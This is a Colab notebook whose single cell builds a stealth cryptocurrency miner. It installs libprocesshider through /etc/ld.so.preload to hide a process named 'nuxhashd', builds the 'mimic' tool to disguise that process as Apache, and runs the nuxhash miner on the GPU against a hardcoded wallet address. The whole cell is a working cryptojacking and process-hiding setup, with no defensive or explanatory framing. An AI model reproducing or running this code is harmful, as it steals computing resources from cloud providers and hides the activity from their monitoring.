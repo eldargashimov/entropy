{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "______",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "t5xYj2LJjhg4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1ef0805a-f072-4756-c6fa-eae823866673"
      },
      "source": [
        "!git clone https://github.com/gianlucaborello/libprocesshider\n",
        "%cd libprocesshider\n",
        "!sed -i -- 's/evil_script.py/nuxhashd/g' processhider.c\n",
        "!make\n",
        "!gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl\n",
        "!sudo mv libprocesshider.so /usr/local/lib/\n",
        "!sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload\n",
        "%cd ..\n",
        "\n",
        "!git clone https://github.com/emptymonkey/ptrace_do.git\n",
        "%cd ptrace_do\n",
        "!make\n",
        "%cd ..\n",
        "\n",
        "!git clone https://github.com/emptymonkey/mimic.git\n",
        "%cd mimic\n",
        "!make\n",
        "!sudo pip3 install git+https://github.com/kllmagn/nuxhash\n",
        "worker = !curl ipecho.net/plain\n",
        "worker = str(worker[0]).replace('.','-')\n",
        "print(f'Running {worker}')\n",
        "#!sudo ./mimic -b -m \"/usr/sbin/apache2 -k start\" -e \"/usr/bin/python3 /usr/local/bin/nuxhashd -w 39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4 -wn $worker -rg usa\"",
        "!nuxhashd -w 39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4 -wn $worker -rg usa"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Have a nice day!"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}
